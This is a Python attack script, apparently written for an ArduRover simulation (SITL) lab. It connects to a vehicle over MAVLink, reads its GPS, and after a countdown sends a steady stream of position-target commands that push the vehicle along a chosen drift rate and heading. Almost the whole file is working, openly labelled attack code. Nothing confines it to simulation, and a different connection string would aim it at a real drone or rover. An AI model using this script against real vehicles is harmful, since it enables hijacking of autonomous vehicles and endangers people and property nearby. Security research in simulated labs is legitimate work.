#!/usr/bin/env python3
import argparse
import math
import time
from datetime import datetime, timezone
from typing import Dict, Optional

from pymavlink import mavutil

R = "\033[91m"; G = "\033[92m"; B = "\033[1m"; X = "\033[0m"


def compute_drift(real: Dict, rate: float, direction_rad: float, elapsed: float) -> Dict:
    dist  = rate * elapsed
    d_lat = (dist * math.cos(direction_rad)) / 111_111.0
    d_lon = (dist * math.sin(direction_rad)) / (111_111.0 * math.cos(math.radians(real["lat"])))
    s = real.copy()
    s["lat"] = real["lat"] + d_lat
    s["lon"] = real["lon"] + d_lon
    s["vn"]  = real.get("vn", 0.0) + rate * math.cos(direction_rad)
    s["ve"]  = real.get("ve", 0.0) + rate * math.sin(direction_rad)
    return s


def send_position(mav, s: Dict):
    TYPE_MASK = 0b0000_1111_1000
    try:
        mav.mav.set_position_target_global_int_send(
            int(time.time() * 1000) & 0xFFFFFFFF,
            mav.target_system, mav.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            TYPE_MASK,
            int(s["lat"] * 1e7),
            int(s["lon"] * 1e7),
            float(s.get("rel_alt", 0.0)),
            float(s.get("vn", 0.0)),
            float(s.get("ve", 0.0)),
            0.0,
            0.0, 0.0, 0.0,
            0.0, 0.0,
        )
    except Exception as e:
        print(f"\n  [CTRL] Erreur: {e}")


def dist_m(lat1, lon1, lat2, lon2) -> float:
    dlat = (lat2 - lat1) * 111_111.0
    dlon = (lon2 - lon1) * 111_111.0 * math.cos(math.radians(lat1))
    return math.hypot(dlat, dlon)


def main():
    p = argparse.ArgumentParser(description="GPS Drift Spoofer — ArduRover SITL")
    p.add_argument("--connection",  default="udp:0.0.0.0:14552")
    p.add_argument("--drift-rate",  type=float, default=0.5,  help="m/s (defaut: 0.5)")
    p.add_argument("--direction",   type=float, default=0.0,  help="degres: 0=Nord 90=Est")
    p.add_argument("--pre-attack",  type=float, default=10.0, help="delai avant attaque (s)")
    args = p.parse_args()

    dir_rad = math.radians(args.direction)

    print("\n" + "=" * 55)
    print("  GPS DRIFT SPOOFER")
    print("=" * 55)
    print(f"  Connexion   : {args.connection}")
    print(f"  Derive      : {args.drift_rate} m/s  cap {args.direction}")
    print(f"  Pre-attaque : {args.pre_attack:.0f}s")
    print("=" * 55)

    print(f"\n  Connexion MAVLink", end="", flush=True)
    mav = mavutil.mavlink_connection(args.connection, autoreconnect=True)
    mav.wait_heartbeat(timeout=30)
    print(f"{G}OK{X}  (system={mav.target_system})")

    mav.mav.request_data_stream_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)

    real_gps: Optional[Dict] = None
    t_start   = time.time()
    t_attack  = None
    last_disp = 0.0
    cmds      = 0

    print(f"  Attaque dans {args.pre_attack:.0f}s  \n")

    try:
        while True:
            msg = mav.recv_match(
                type=["GPS_RAW_INT", "GLOBAL_POSITION_INT"],
                blocking=True, timeout=1.0)
            if msg is None:
                continue

            if msg.get_type() == "GPS_RAW_INT":
                try:
                    real_gps = {
                        "lat":     msg.lat / 1e7,
                        "lon":     msg.lon / 1e7,
                        "alt":     msg.alt / 1000.0,
                        "rel_alt": 0.0,
                        "vn": 0.0, "ve": 0.0,
                        "sats":    int(msg.satellites_visible),
                        "hdop":    msg.eph / 100.0 if msg.eph < 65535 else 9.99,
                    }
                except Exception:
                    pass

            elif msg.get_type() == "GLOBAL_POSITION_INT" and real_gps:
                real_gps["vn"]      = msg.vx / 100.0
                real_gps["ve"]      = msg.vy / 100.0
                real_gps["rel_alt"] = msg.relative_alt / 1000.0

            if real_gps is None:
                continue

            elapsed = time.time() - t_start

            if elapsed >= args.pre_attack:
                if t_attack is None:
                    t_attack = time.time()
                    print(f"\n\n  {R}{B}[ATTAQUE DECLENCHEE]{X} "
                          f"drift {args.drift_rate} m/s @ {args.direction} deg\n")

                spoof = compute_drift(real_gps, args.drift_rate, dir_rad,
                                      time.time() - t_attack)
                send_position(mav, spoof)
                cmds += 1

            # Affichage toutes les 0.25s
            now = time.time()
            if now - last_disp < 0.25:
                continue
            last_disp = now
            ts = datetime.now(timezone.utc).strftime("%H:%M:%S")

            if t_attack is None:
                rem = args.pre_attack - elapsed
                print(f"\r[{ts}] {G}PRE-ATTAQUE{X}  "
                      f"lat={real_gps['lat']:.5f}  lon={real_gps['lon']:.5f}  "
                      f"sats={real_gps['sats']}  hdop={real_gps['hdop']:.2f}  "
                      f"dans {rem:.0f}s   ", end="", flush=True)
            else:
                sp = compute_drift(real_gps, args.drift_rate, dir_rad,
                                   time.time() - t_attack)
                d  = dist_m(real_gps["lat"], real_gps["lon"], sp["lat"], sp["lon"])
                print(f"\r[{ts}] {R}{B}DRIFT{X}  "
                      f"Dpos={d:6.1f}m  "
                      f"real=({real_gps['lat']:.5f},{real_gps['lon']:.5f})  "
                      f"spoof=({sp['lat']:.5f},{sp['lon']:.5f})  "
                      f"cmds={cmds}   ", end="", flush=True)

    except KeyboardInterrupt:
        print("\n\n  Arret.\n")


if __name__ == "__main__":
    main()
